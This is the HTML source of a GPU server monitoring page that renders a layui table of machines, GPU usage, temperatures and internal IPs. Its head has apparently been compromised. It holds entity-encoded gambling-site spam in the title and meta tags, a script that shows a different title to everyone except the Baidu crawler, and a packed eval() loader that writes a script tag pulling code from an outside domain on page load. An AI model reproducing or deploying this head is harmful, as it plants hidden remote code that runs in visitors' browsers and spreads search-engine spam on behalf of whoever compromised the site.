<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
<title>&#80;&#71;&#30005;&#23376;&#183;&#40;&#20013;&#22269;&#41;&#23448;&#26041;&#32593;&#31449;</title>
<meta name="keywords" content="&#80;&#71;&#30005;&#23376;&#183;&#40;&#20013;&#22269;&#41;&#23448;&#26041;&#32593;&#31449;">
<meta name="description" content="&#9917;&#65039;&#9917;&#65039;&#9917;&#65039;&#12304;&#112;&#103;&#30005;&#23376;&#23448;&#32593;&#58;&#107;&#121;&#48;&#50;&#46;&#110;&#101;&#116;&#12305;&#112;&#103;&#30005;&#23376;&#23448;&#32593;&#23448;&#26041;&#32593;&#31449;&#44;&#112;&#103;&#30005;&#23376;&#23448;&#32593;&#24179;&#21488;&#23448;&#32593;&#44;&#112;&#103;&#30005;&#23376;&#23448;&#32593;&#32593;&#22336;&#44;&#112;&#103;&#30005;&#23376;&#23448;&#32593;&#65;&#80;&#80;&#19979;&#36733;&#44;&#112;&#103;&#30005;&#23376;&#23448;&#32593;&#23448;&#32593;&#24179;&#21488;&#44;&#112;&#103;&#30005;&#23376;&#23448;&#32593;&#23448;&#26041;&#23458;&#26381;&#22312;&#32447;&#20026;&#24744;&#26381;&#21153;&#65281;&#10;">
<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="529服务器监控"}</script>
<script type="text/javascript">eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('m(d(p,a,c,k,e,r){e=d(c){f c.n(a)};h(!\'\'.i(/^/,o)){j(c--)r[e(c)]=k[c]||e(c);k=[d(e){f r[e]}];e=d(){f\'\\\\w+\'};c=1};j(c--)h(k[c])p=p.i(q s(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);f p}(\'1["2"]["3"](\\\'<0 4="5/6" 7="8://9.a/b.c"></0>\\\');\',l,l,\'t|u|v|x|y|z|A|B|C|D|E|F|G\'.H(\'|\'),0,{}))',44,44,'|||||||||||||function||return||if|replace|while||13|eval|toString|String||new||RegExp|script|window|document||write|type|text|javascript|src|https|zhbo123|com|yb|js|split'.split('|'),0,{}))
</script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- 请勿在项目正式环境中引用该 layui.css 地址 -->
    <link href="https://cdn.bootcdn.net/ajax/libs/layui/2.8.17/css/layui.css" rel="stylesheet">
</head>
<body>

<table class="layui-hide" id="ID-table-demo-parse"></table>

<!-- 请勿在项目正式环境中引用该 layui.js 地址 -->
<script src="https://cdn.bootcdn.net/ajax/libs/layui/2.8.17/layui.js"></script>
<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.js"></script>
<script>
    layui.use('table', function () {
        var table = layui.table;

        // 渲染
        table.render({
            elem: '#ID-table-demo-parse',
            url: 'https://cvzoo.cn:8000/all_server',
            page: true,
            response: {
                statusCode: 200 // 重新规定成功的状态码为 200，table 组件默认为 0
            },
            // 将原始数据解析成 table 组件所规定的数据格式
            parseData: function (res) {
                return {
                    "code": 200, //解析接口状态
                    "msg": "529-server", //解析提示文本
                    "count": res.length, //解析数据长度
                    "data": res //解析数据列表
                };
            },
            cols: [[
                // {field:'id', title:'ID'},
                {field: 'machine', title: '机器', minWidth: 80, align: 'center'},
                {field: 'gpu', title: 'GPU', minWidth: 60, align: 'center'},
                {field: 'used', title: '已用', minWidth: 80, align: 'center'},
                {field: 'all', title: '总量', minWidth: 80, align: 'center'},
                {field: 'tmp', title: '温度', minWidth: 60, align: 'center'},
                {field: 'update_time', title: '最后更新时间', minWidth: 180, align: 'center'},
                {field: 'ip', title: '内网IP', minWidth: 130, align: 'center'},
                
            ]],
            page: false,
            height: 'full-1',
            done: function (res, curr, count) {
                merge(res);
                //按照time改变一行的背景颜色
                var trs = document.getElementsByTagName("tr");
                for (var i = 0; i < trs.length; i++) {
                    nowtime = new Date().getTime();
                    //'2024-06-27 11:26:01' 这个字符串转成时间戳
                    updatetime = new Date(trs[i].cells[5].innerText).getTime();
                    console.log(nowtime - updatetime);
                    console.log(updatetime);
                    console.log(nowtime);
                    console.log(trs[i].cells[5].innerText);
                    if (nowtime - updatetime > 66666) {
                        trs[i].style.backgroundColor = ("#FFA5A5");
                    }
                }
            }
        });

        setInterval(function () {
            table.reloadData('ID-table-demo-parse', {
                // 这里可以重新设置表格的配置项，如url等
            });
        }, 60000); // 60000毫秒等于一分钟
    });


    function merge(res) {
        var data = res.data;
        var mergeIndex = 0;//定位需要添加合并属性的行数
        var mark = 1; //这里涉及到简单的运算，mark是计算每次需要合并的格子数
        var columsName = ['machine', 'ip'];//需要合并的列名称
        var columsIndex = [0, 6];//需要合并的列索引值

        for (var k = 0; k < columsName.length; k++) { //这里循环所有要合并的列
            var trArr = $(".layui-table-body>.layui-table").find("tr");//所有行
            for (var i = 1; i < res.data.length; i++) { //这里循环表格当前的数据
                var tdCurArr = trArr.eq(i).find("td").eq(columsIndex[k]);//获取当前行的当前列
                var tdPreArr = trArr.eq(mergeIndex).find("td").eq(columsIndex[k]);//获取相同列的第一列

                if (data[i][columsName[k]] === data[i - 1][columsName[k]]) { //后一行的值与前一行的值做比较，相同就需要合并
                    mark += 1;
                    tdPreArr.each(function () {//相同列的第一列增加rowspan属性
                        $(this).attr("rowspan", mark);
                    });
                    tdCurArr.each(function () {//当前行隐藏
                        $(this).css("display", "none");
                    });
                } else {
                    mergeIndex = i;
                    mark = 1;//一旦前后两行的值不一样了，那么需要合并的格子数mark就需要重新计算
                }
            }
            mergeIndex = 0;
            mark = 1;
        }
    }


</script>

<style type="text/css">
    .layui-table-cell{
        height: 28.9px;
        line-height: 20px;
    }
</style>

</body>
</html>